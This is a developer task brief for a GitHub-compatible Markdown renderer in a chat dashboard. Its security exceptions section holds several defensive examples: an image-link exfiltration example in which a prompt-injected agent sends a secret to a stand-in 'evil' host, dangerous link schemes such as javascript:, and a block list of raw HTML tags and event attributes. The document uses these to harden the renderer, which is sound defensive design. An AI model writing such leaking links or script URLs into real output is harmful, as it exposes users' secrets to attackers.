# FIX-137: Real Markdown in chat — everything CommonMark and GitHub render, still safe — **medium–large, phase 5**

## Goal
The owner (2026-11-13): "Improve markdown support in the chat view, a lot. links have to work, at the very
least!" and (2026-11-14): "make sure markdown tables in chat (and external channels) render correctly. in
fact, make sure all standard+github markdown renders correctly. there have better be very serious security
reasons to break some formatting!"

The renderer is a hand-written 100-line subset (`web/src/components/apps/markdown.tsx`, used by
`components/chat/message-group.tsx:124,310`, the apps connect view, memory, integration dialog, dynamic
forms): headings, paragraphs, flat lists, fenced code, `**bold**`, `` `code` ``, `[text](url)`. Almost
everything else is missing or wrong (bare URLs, italics, tables, nested lists, quotes, …).

**Target: everything github.com renders in a comment renders the same here**, except the short list of
exceptions in D-227, each of which has a security reason. Anything else that renders differently from
GitHub is a bug.

## What must render (the target set)
1. **CommonMark 0.31** — all of it, including entity and numeric character references, backslash
   escapes, hard breaks, setext headings, indented code, lazy continuation, link reference definitions,
   ordered lists with any start number, nested containers.
2. **GFM spec** — tables (alignment, inline formatting and escaped pipes in cells), task lists (read-only
   checkboxes), strikethrough (`~` and `~~`), extended autolinks (bare `http(s)://`, `www.`, email
   addresses), and the tag filter.
3. **github.com additions** — footnotes (`[^1]`, with back-links), alerts (`> [!NOTE]`, `[!TIP]`,
   `[!IMPORTANT]`, `[!WARNING]`, `[!CAUTION]`, styled with tokens), emoji shortcodes (`:tada:`),
   syntax-highlighted fenced code (language label + **Copy**), math (`$…$`, `$$…$$`, ```` ```math ````),
   Mermaid diagrams (```` ```mermaid ````), heading anchors, and **raw HTML from GitHub's allowlist**:
   `b i em strong s del ins sub sup kbd mark small br hr p div span details summary blockquote code pre
   ul ol li table thead tbody tr th td h1–h6` and `a` (subject to the link rule), with only the
   attributes GitHub keeps that are harmless here (`open` on `details`, `align`, `colspan`, `rowspan`,
   `start`/`type` on lists). Everything else (`script`, `style`, `iframe`, `form`, `input`, `object`,
   `svg` as raw HTML, `on*` attributes, `style` and `class` attributes) is dropped, keeping its text.
4. Person messages keep single newlines as line breaks (as today; GitHub comments do the same).

## The only exceptions (D-227) — the renderer differs from GitHub here and nowhere else
1. **Images from other origins are not loaded**: shown as a link "🖼 <alt>" to the image (clicking opens
   it). Reason: loading is zero-click — a prompt-injected agent writing `![](https://evil/?d=<secret>)`
   leaks data the moment the message is shown; the CSP (`img-src`) would block it anyway. Images on this
   dashboard's own origin (attachments) **are** shown inline.
2. **Links**: only `http`, `https`, `mailto` (and same-origin relative links) are links; any other scheme
   (`javascript:`, `data:`, `vbscript:`, …) renders as its label text. Reason: script execution. A link
   whose **label itself looks like a URL or domain that differs from the real destination's host**
   (`[https://cern.ch](https://evil.example)`) gets a muted "→ evil.example" suffix. Reason: that is the
   one form of link that lies about where it goes. Ordinary labels (`[the docs](…)`) render exactly like
   GitHub, with the full URL in the tooltip. Links open in a new tab with `rel="noopener noreferrer
   nofollow"` (same-origin links stay in the tab).
3. **Raw HTML outside the allowlist** (item 3 above) is dropped, keeping its text. Reason: XSS. GitHub
   does the same with its own allowlist; ours is the same list or narrower, never wider.
4. **Mermaid** runs with `securityLevel: "strict"` (no HTML labels, no click callbacks) and math with
   KaTeX `trust: false`. If either cannot run under the dashboard CSP without loosening it, it renders
   as a highlighted code block and the brief's report says why. Reason: both have had XSS advisories.
Nothing else is an exception: if a construct does not render like GitHub, fix it.

## Plan
1. **Parser and renderer**: `react-markdown` + `remark-gfm` (+ `remark-math`/`rehype-katex`,
   footnotes via remark-gfm, a small alerts plugin, emoji shortcodes, `rehype-raw` **followed by
   `rehype-sanitize`** with the allowlist above as an explicit schema). Rendering stays React elements —
   never `dangerouslySetInnerHTML`; raw HTML goes parse → hast → sanitize → React. Pin exact versions,
   licence check, bundle-size delta in the report. KaTeX, the highlighter and Mermaid are **lazy-loaded**
   only when a message contains math, code or a diagram.
2. **Links and images** per the exceptions; `safeHref` stays the gate and also covers `href` in allowed
   raw `<a>` and footnote links.
3. **Layout**: tables scroll horizontally inside their own container (never the page) at 390 px, header
   row styled, alignment honoured; code blocks scroll inside themselves; headings sized for a bubble;
   alerts, footnotes, task lists, `details` styled with tokens in both themes.
4. **Streaming**: half-finished Markdown while a reply streams must not flicker badly (an unclosed fence
   renders as a code block until closed; an incomplete table row is held back); memoise per finished
   block; lazy chunks load once.
5. **One renderer everywhere** it is used today (chat, memory, connect view, setup guides, dynamic-form
   help); setup guides (trusted, package-signed) use the same safe mode.
6. Docs: `14` (renderer rules: "renders like GitHub except D-227's list"), `17` SEC-18 row.

      both themes, no page-level horizontal scroll; axe clean.
